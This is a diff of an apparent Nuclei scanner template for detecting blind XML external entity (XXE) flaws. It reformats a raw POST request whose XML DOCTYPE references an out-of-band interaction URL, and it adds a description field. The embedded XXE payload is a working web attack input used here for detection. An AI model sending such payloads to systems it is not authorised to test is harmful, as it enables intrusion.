@@ -1,5 +1,4 @@
 id: generic-blind-xxe
-
 info:
   name: Generic Blind XXE
   author: geeknik
@@ -7,21 +6,27 @@ info:
   tags: xxe,generic,blind
   metadata:
     max-request: 1
-
+  description: Generic Blind XXE detected
 http:
-  - raw:
-      - |
-        POST / HTTP/1.1
-        Host: {{Hostname}}
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-        Referer: {{BaseURL}}
+- raw:
+  - 'POST / HTTP/1.1
 
-        <?xml version="1.0"?>
-        <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
-        <foo>&e1;</foo>
+    Host: {{Hostname}}
 
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "http"
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Referer: {{BaseURL}}
+
+
+    <?xml version="1.0"?>
+
+    <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
+
+    <foo>&e1;</foo>
+
+    '
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - http
